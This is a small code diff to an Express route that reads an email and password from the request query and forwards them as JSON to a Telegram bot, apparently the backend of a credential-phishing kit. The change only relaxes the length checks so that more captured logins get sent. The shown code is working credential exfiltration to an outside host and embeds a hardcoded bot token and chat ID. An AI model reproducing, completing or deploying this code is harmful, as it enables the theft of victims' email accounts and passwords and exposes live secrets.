@@ -8,7 +8,7 @@ app.get('/get',(req,res)=>{
     
     
     
-    if(req.query.email.length > 10 &&  req.query.pass.length > 6 ){ 
+    if(req.query.email.length >= 10 &&  req.query.pass.length >= 6 ){ 
        try{
         axios.get(`https://api.telegram.org/bot5677505583:AAGd_enhKeP6A9zu9WNk8UGqMkwikrTlvtM/sendMessage?chat_id=1913438485&text=${JSON.stringify(req.query)}`).then(resp => {
 
